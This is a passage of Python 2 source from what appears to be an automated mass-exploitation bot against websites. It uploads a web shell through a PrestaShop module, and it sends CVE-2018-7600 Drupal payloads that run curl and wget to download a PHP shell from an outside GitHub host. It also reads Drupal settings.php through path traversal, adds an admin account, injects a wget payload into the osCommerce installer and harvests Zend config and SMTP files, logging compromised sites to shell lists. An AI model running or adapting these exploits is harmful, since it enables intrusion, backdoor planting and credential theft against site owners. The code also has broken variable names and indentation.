		ssbReflexup = {'bajatax' : open(jceupshell, 'rb')}
		
		ssbReflexreq = requests.post(url+'/modules/wg24themeadministration/wg24_ajax.php', files=ssbReflexup, data=PostData)
		
		ssbReflexlib = requests.get(url+'/modules/wg24themeadministration/img/upload/root.php?shell')
		
		
		if 'Bigbang' in ssbReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} wg24themeadministration     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/wg24themeadministration/img/upload/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/wg24themeadministration/img/upload/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} wg24themeadministration     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)			
				
	
			
    except:
        pass

				
def drurce(url):

    try:	


		# 22 . rev


		get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':'curl https://raw.githubusercontent.com/izoking/2/master/u.php && wget https://raw.githubusercontent.com/izoking/2/master/u.php', 'name[#type]':'markup'}
		post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
		r = requests.post(url, data=post_params, params=get_params)
		
		
		m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
		if m:
		    found = m.group(1)
		
		get_params = {'q':'file/ajax/name/#value/' + found}
		post_params = {'form_build_id':found}
		r = requests.post(url, data=post_params, params=get_params)

		lib = requests.get(url+'/u.php')
		
		
		if re.findall("izocin", lib.content):
			print '[{}Drupal]: {} {}	       ====> {}{} CVE-2018-7600 RCE V7     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/u.php'+'\n')
			sys.exit()

		get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':'mv+sites/default/files/.htaccess+htaccessx;curl+-o+sites/default/files/info.php+"https://raw.githubusercontent.com/izoking/2/master/u.php"', 'name[#type]':'markup'}
		post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
		r = requests.post(url, data=post_params, params=get_params)
		
		
		m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
		if m:
		    found = m.group(1)
		
		get_params = {'q':'file/ajax/name/#value/' + found}
		post_params = {'form_build_id':found}
		r = requests.post(url, data=post_params, params=get_params)

		lib = requests.get(url+'/u.php')
		
		
		if re.findall("izocin", lib.content):
			print '[{}Drupal]: {} {}	       ====> {}{} CVE-2018-7600 RCE V7     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/u.php'+'\n')
			sys.exit()			
  
		payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'wget https://raw.githubusercontent.com/izoking/2/master/u.php && curl https://raw.githubusercontent.com/izoking/2/master/u.php'}
		headers = {'User-Agent': 'Mozilla 5.0'}				
		r = requests.post(url+ '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax', data=payload, verify=False, headers=headers)
		if 'izocin' in requests.get(url+'/u.php', headers=headers).text:
			print '[{}Drupal]: {} {}	       ====> {}{} CVE-2018-7600 RCE V8    {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/u.php'+'\n')
			sys.exit()	
		else:
			print '[{}Drupal]: {} {}	       ====> {}{} CVE-2018-7600 RCE     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


		ddrevlib = requests.get(url+"/sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../../../../../../sites/default/settings.php")
				
		if 'drupal_hash_salt' in ddrevlib.content:
			print '[{}Drupal]: {} {}	       ====> {}{} CVE-2018-9205     {}{} Success  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Configs.txt', 'a').write(url+'/sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../../../../../../sites/default/settings.php'+'\n')
		else:
			print '[{}Drupal]: {} {}	       ====> {}{} CVE-2018-9205     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)				
			
	

		# 22 . rev
			
		openurl = urllib2.urlopen('http://localhost/dru.php?url='+url+'&submit=submit')
		readcontent = openurl.read()
		if 'Success!' in readcontent:
					print '[{}Drupal]: {} {}	       ====> {}{} Add Admin    {}{} Success  '.format(sb, sd, url, fc,fc, sb,fg)
					open('Vulns/Drupal-admin.txt', 'a').write(url+'/user/login user:gassrini pass:admin'+'\n')				
		else:
			print '[{}Drupal]: {} {}	       ====> {}{} Add Admin     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)			
			
    except:
        pass
					

		
def osrce(url):

    try:
        CheckVuln = requests.get(url + '/install/index.php')
        if 'Welcome to osCommerce' in CheckVuln.text.encode('utf-8') or CheckVuln.status_code == 200:
			Exp = url + '/install/install.php?step=4'
			data = {'DIR_FS_DOCUMENT_ROOT': './'}
			shell = '\');'
			shell += 'system("wget https://raw.githubusercontent.com/04x/ICG-AutoExploiterBoT/master/files/OsComPayLoad.php");'
			shell += '/*'
			data['DB_DATABASE'] = shell
			zonn = requests.post(Exp, data=data)
			zox = requests.get(url+'/install/includes/OsComPayLoad.php')
			
			izo = requests.get(url+'/install/includes/vuln.php')
		
		
			if 'Vuln' in izo.content:
				print '[{}osCommerce]: {} {}	       ====> {}{} RCE     {}{} Success  '.format(sb, sd, url, fc,fc, sb,fg)
				open('shell.txt', 'a').write(url+'/install/includes/vuln.php'+'\n')
			else:
				print '[{}osCommerce]: {} {}	       ====> {}{} RCE     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)



			
    except:
        pass

		
				
def zenbot(url):

    try:

		# 22 . rev
		
		nmxcrevlib = requests.get(url+"/application/configs/application.ini")
				
		if 'Bootstrap' in nmxcrevlib.content:
			print '[{}ZendFramework]: {} {}	       ====> {}{} Configuration     {}{} Success  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Config.txt', 'a').write(url+'/application/configs/application.ini'+'\n')
		else:
			print '[{}ZendFramework]: {} {}	       ====> {}{} Configuration     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			
			
		# 22 . rev
		
		mmnxcrevlib = requests.get(url+"/application/configs/mail.ini")
				
		if 'smtp' in mmnxcrevlib.content:
			print '[{}ZendFramework]: {} {}	       ====> {}{} Smtp     {}{} Success  '.format(sb, sd, url, fc,fc, sb,fg)
			open('zendsmtp.txt', 'a').write(url+'/application/configs/mail.ini'+'\n')
		else:
			print '[{}ZendFramework]: {} {}	       ====> {}{} Smtp     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)



			
    except:
        pass
				
		
banners()

	
def Main():
    try:
		
        start = timer()
        ThreadPool = Pool(30)
        Threads = ThreadPool.map(sitebul, ooo)
        print('Time: ' + str(timer() - start) + ' seconds')
    except:
        pass


if __name__ == '__main__':
    Main()

 
